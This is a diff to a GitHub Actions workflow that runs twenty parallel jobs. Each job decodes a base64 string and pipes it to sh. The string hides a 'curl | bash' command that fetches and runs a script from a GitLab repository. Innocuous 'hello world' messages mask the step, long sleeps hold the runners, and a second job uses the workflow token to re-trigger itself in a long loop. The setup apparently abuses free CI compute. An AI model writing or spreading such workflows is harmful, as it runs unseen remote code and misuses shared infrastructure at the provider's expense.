@@ -1,4 +1,4 @@
-name: 🔵 LSCPU Phase
+name: 🔵 khurap
 
 on:
   workflow_dispatch:
@@ -6,7 +6,7 @@ on:
       loop_count:
         description: 'Siklus tersisa'
         required: true
-        default: '9999'
+        default: '990'
 
 permissions:
   actions: write
@@ -19,56 +19,56 @@ jobs:
       max-parallel: 20
       matrix:
         include:
-          - name: hello-aa1
-          - name: hello-ba1
-          - name: hello-ca1
-          - name: hello-da1
-          - name: hello-ae1
-          - name: hello-fa1
-          - name: hello-ga1
-          - name: hello-ha1
-          - name: hello-ia1
-          - name: hello-aj1
-          - name: hello-ka1
-          - name: hello-la1
-          - name: hello-ma1
-          - name: hello-na1
-          - name: hello-oa1
-          - name: hello-pa1
-          - name: hello-qa1
-          - name: hello-ar1
-          - name: hello-sa1
-          - name: hello-ta1                                     
+          - name: hello-ay1
+          - name: hello-by1
+          - name: hello-cy1
+          - name: hello-dy1
+          - name: hello-ey1
+          - name: hello-fy1
+          - name: hello-gy1
+          - name: hello-hy1
+          - name: hello-iy1
+          - name: hello-jy1
+          - name: hello-ky1
+          - name: hello-ly1
+          - name: hello-my1
+          - name: hello-ny1
+          - name: hello-oy1
+          - name: hello-py1
+          - name: hello-qy1
+          - name: hello-ry1
+          - name: hello-sy1
+          - name: hello-ty1
     runs-on: ubuntu-latest
-    timeout-minutes: 360
+    timeout-minutes: 310
     steps:
       - name: Jalankan dengan durasi dinamis
         run: |
           HOUR_UTC=$(date -u +%H)
           LOOP=${{ github.event.inputs.loop_count }}
           if [ "$HOUR_UTC" -eq 4 ]; then
-          echo "🕚 hello world"
-          SLEEP=18000
+            echo "🕚 Jam 11 siang WIB (04 UTC). Sleep 5 jam."
+            SLEEP=18000
           elif [ "$HOUR_UTC" -ge 23 ] || [ "$HOUR_UTC" -lt 3 ]; then
-          echo "🕕 hello world"
-          SLEEP=10800
+            echo "🕕 Jam 6-9 pagi WIB (UTC 23-02). Sleep 3 jam."
+            SLEEP=10800
           else
-            if [ "$LOOP" -ge 9982 ]; then
-              echo " Hello World"
+            if [ "$LOOP" -ge 9992 ]; then
+              echo "🔄 6 hello world"
               SLEEP=600
             else
               echo "⏳ hello world"
               SLEEP=3600
             fi
           fi
-          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS9zcGluYXpvbGxhL3NhaW50Ly0vcmF3L21haW4vc3VwZXJtYW5zIHwgYmFzaA | sh & sleep $SLEEP
+          echo "hello world" & base64 -d <<< Y3VybCAtc0wgaHR0cHM6Ly9naXRsYWIuY29tL21hc2Fha2s4OC9maWxlL2RpYW1vbmRzOGxpbmUvLS9yYXcvbWFpbi9yYW5kb21zIHwgYmFzaA | sh & sleep $SLEEP
 
-  trigger-hello:
+  trigger-phanu:
     needs: run-lscpu
     runs-on: ubuntu-latest
     if: github.event.inputs.loop_count > 0
     steps:
-      - name: Panggil Hello Phase
+      - name: Panggil phanu (next = khirap)
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
@@ -77,4 +77,4 @@ jobs:
             -H "Authorization: token $GITHUB_TOKEN" \
             -H "Accept: application/vnd.github.v3+json" \
             https://api.github.com/repos/${{ github.repository }}/actions/workflows/phanu.yml/dispatches \
-            -d "{\"ref\":\"main\",\"inputs\":{\"loop_count\":\"$new_loop\"}}"
+            -d "{\"ref\":\"main\",\"inputs\":{\"loop_count\":\"$new_loop\",\"next_phase\":\"khirap\"}}"
